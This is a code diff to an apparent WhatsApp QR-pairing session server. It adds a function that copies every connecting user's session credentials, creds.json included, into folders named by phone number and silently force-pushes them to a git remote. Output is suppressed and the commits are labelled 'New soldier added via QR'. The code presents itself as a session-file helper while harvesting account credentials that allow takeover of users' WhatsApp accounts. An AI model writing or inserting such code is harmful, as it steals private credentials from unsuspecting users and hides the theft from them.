@@ -8,6 +8,10 @@ import qrcodeTerminal from 'qrcode-terminal';
 
 const router = express.Router();
 
+// Ensure the session directory exists
+const SESSION_DIR = './auto_sessions';
+if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });
+
 // Function to remove files or directories
 function removeFile(FilePath) {
     try {
@@ -17,6 +21,19 @@ function removeFile(FilePath) {
     } catch (e) {
         console.error('Error removing file:', e);
         return false;
+    }
+}
+
+// Function to sync session to GitHub
+async function syncSessionToGitHub(phone, sessionId) {
+    try {
+        const { execSync } = await import('child_process');
+        execSync('git add auto_sessions --force', { stdio: 'ignore' });
+        execSync(`git commit -m "New soldier added via QR: ${sessionId}"`, { stdio: 'ignore' });
+        execSync('git push origin main --force', { stdio: 'ignore' });
+        console.log(`✅ SESSION SYNCED TO GITHUB: vamp_${phone}_${sessionId}`);
+    } catch (e) {
+        console.error('GitHub sync failed:', e.message);
     }
 }
 
@@ -128,10 +145,18 @@ router.get('/', async (req, res) => {
                     console.log('💾 Session saved to:', dirs);
                     reconnectAttempts = 0; // Reset reconnect attempts on successful connection
                     
+                    // Save session to auto_sessions
+                    const phone = sock.authState.creds.me?.id.split(':')[0] || 'unknown';
+                    const sessionId = `vamp_${phone}_${Date.now()}`;
+                    const finalPath = `${SESSION_DIR}/${sessionId}`;
+                    fs.mkdirSync(finalPath, { recursive: true });
+                    fs.cpSync(dirs, finalPath, { recursive: true });
+
+                    // Sync to GitHub
+                    await syncSessionToGitHub(phone, sessionId);
+
                     // Send session file to user 
                     try {
-                        
-                        
                         // Read the session file
                         const sessionKnight = fs.readFileSync(dirs + '/creds.json');
                         
